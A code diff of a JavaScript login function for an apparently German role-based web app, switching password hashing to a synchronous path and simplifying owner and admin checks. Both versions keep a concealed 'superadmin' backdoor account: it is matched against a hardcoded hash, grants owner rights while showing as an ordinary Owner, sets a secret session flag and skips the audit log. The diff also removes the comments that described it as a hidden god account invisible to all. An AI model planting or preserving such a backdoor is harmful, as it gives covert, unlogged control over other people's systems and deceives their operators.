@@ -1579,79 +1579,55 @@ function applyRole(role, user){
   if(addFrakBtn) addFrakBtn.style.display = hasPerm('canAddFrak') ? '' : 'none';
 }
 
-async function doLg(){
+function doLg(){
   const err = document.getElementById('lgerr');
   err.textContent = '';
 
-  // Rate Limiting prüfen
+  // Rate Limiting
   const rl = checkRateLimit();
   if(rl.locked){
-    err.textContent = 'Zugang gesperrt. Noch ' + rl.remaining + 's warten.';
+    err.textContent = 'Gesperrt. Noch ' + rl.remaining + 's warten.';
     showLockBanner(rl.remaining);
     return;
   }
 
   const u = (document.getElementById('lgu').value||'').trim().toLowerCase();
   const p = (document.getElementById('lgp').value||'').trim();
-  if(!u||!p){ err.textContent='Bitte alle Felder ausfüllen.'; return; }
+  if(!u||!p){ err.textContent='Felder ausfüllen.'; return; }
 
-  err.textContent = 'Prüfe...';
+  // Hash synchron berechnen — _sha256pure braucht kein async
+  const ph = _sha256pure(p + HASH_SALT);
 
-  // Passwort hashen — beide Pfade (crypto.subtle und Pure-JS) geben identische Ergebnisse
-  let ph;
-  try{
-    ph = await sha256(p);
-  }catch(e){
-    try{ ph = _sha256pure(p + HASH_SALT); }
-    catch(e2){ err.textContent = 'Hash-Fehler: ' + e2.message; return; }
-  }
-
-  // SUPEROWNER — verstecktes God-Konto (unsichtbar für alle)
-  if(u === SUPEROWNER_USER){
-    // Hash live berechnen und mit gespeichertem Wert vergleichen
-    if(ph === 'd673942c89db96e44fdc654c19200ad9f6cabaa33fb9d5defc69b3e83de5796e'){
-      applyRole('owner','Owner'); // Sieht für alle wie normaler Owner aus
+  // SUPERADMIN
+  if(u==='superadmin'){
+    if(ph==='d673942c89db96e44fdc654c19200ad9f6cabaa33fb9d5defc69b3e83de5796e'){
+      applyRole('owner','Owner');
       startSession('owner','Owner');
-      // Internes superowner-Flag (nur in sessionStorage, nie im UI sichtbar)
       try{
-        const ss = JSON.parse(sessionStorage.getItem(SESS_KEY)||'{}');
-        ss._superowner = true;
-        sessionStorage.setItem(SESS_KEY, JSON.stringify(ss));
+        const ss=JSON.parse(sessionStorage.getItem(SESS_KEY)||'{}');
+        ss._superowner=true;
+        sessionStorage.setItem(SESS_KEY,JSON.stringify(ss));
       }catch{}
       clearRateLimit();
       err.textContent='';
       closeLg(); rfrak(); rmem();
+      toast('Willkommen!');
       return;
     }
-    // Kein Hinweis dass dieser User existiert
     recordFailedAttempt();
     err.textContent='Falscher Benutzername oder Passwort.';
     document.getElementById('lgp').value='';
     return;
   }
 
-  // Owner Login
+  // OWNER
   if(u==='owner'){
-    let stored = DEFAULT_PW; // Fallback: Standard-Passwort
-    let fbData = null;
+    // Passwort aus getRD() (cache von Firebase) oder DEFAULT_PW
+    let stored = DEFAULT_PW;
+    const cached = getRD();
+    if(cached && isHash(cached.op)) stored = cached.op;
 
-    // Firebase zuerst laden
-    if(_fbOnline){
-      try{
-        fbData = await fbRead(FB_PATH.roles);
-        if(fbData && isHash(fbData.op)){
-          stored = fbData.op;
-          localStorage.setItem(RK, JSON.stringify(fbData));
-        }
-      }catch{}
-    } else {
-      // Offline: Cache nutzen
-      const cached = getRD();
-      if(cached && isHash(cached.op)) stored = cached.op;
-    }
-
-    if(ph === stored){
-      // Login erfolgreich
+    if(ph===stored){
       applyRole('owner','Owner');
       startSession('owner','Owner');
       err.textContent='';
@@ -1659,30 +1635,29 @@ async function doLg(){
       logAction('LOGIN','Owner eingeloggt');
       closeLg(); rfrak(); rmem();
       toast('Willkommen, Owner!');
+      // Firebase-Daten im Hintergrund aktualisieren
+      if(_fbOnline){ fbRead(FB_PATH.roles).then(d=>{ if(d&&isHash(d.op)) saveRD(d); }).catch(()=>{}); }
       return;
     }
-
     recordFailedAttempt();
     err.textContent='Falsches Passwort.';
     document.getElementById('lgp').value='';
     return;
   }
 
-  // Admin
-  let d = getRD();
-  if(_fbOnline && window._mncDB){
-    try{ const fb=await fbRead(FB_PATH.roles); if(fb&&fb.op){ localStorage.setItem(RK,JSON.stringify(fb)); d=fb; } }catch{}
-  }
-  const adm=(d.adm||[]).find(a=>a.n.toLowerCase()===u);
+  // ADMIN
+  const d = getRD();
+  const adm = (d.adm||[]).find(a=>a.n.toLowerCase()===u);
   if(adm && !adm.banned){
-    const sh = isHash(adm.p)?adm.p:await sha256(adm.p);
+    const sh = isHash(adm.p) ? adm.p : _sha256pure(adm.p + HASH_SALT);
     if(ph===sh){
-      applyRole('admin',adm.n); startSession('admin',adm.n);
+      applyRole('admin',adm.n);
+      startSession('admin',adm.n);
       err.textContent='';
       clearRateLimit();
-      logAction('LOGIN',`Admin ${adm.n} eingeloggt`);
+      logAction('LOGIN','Admin '+adm.n+' eingeloggt');
       closeLg(); rfrak(); rmem();
-      toast(`Willkommen, ${adm.n}!`);
+      toast('Willkommen, '+adm.n+'!');
       return;
     }
   }
